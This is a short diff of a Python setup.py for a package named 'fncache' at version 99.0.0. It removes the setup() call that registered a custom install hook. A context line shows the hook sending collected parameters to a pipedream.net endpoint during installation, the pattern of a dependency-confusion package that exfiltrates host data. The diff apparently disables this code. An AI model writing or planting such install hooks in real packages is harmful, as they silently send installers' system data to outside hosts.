@@ -15,11 +15,5 @@ class CustomInstall(install):
         requests.get("https://eol6mx6at717hhs.m.pipedream.net/fncache",params = ploads)
 
 
-setup(name='fncache',
-      version='99.0.0',
-      description='test',
-      author='test',
-      license='MIT',
-      zip_safe=False,
-      cmdclass={'install': CustomInstall})
+# setup(...) removed                                                                                                                                                              
 
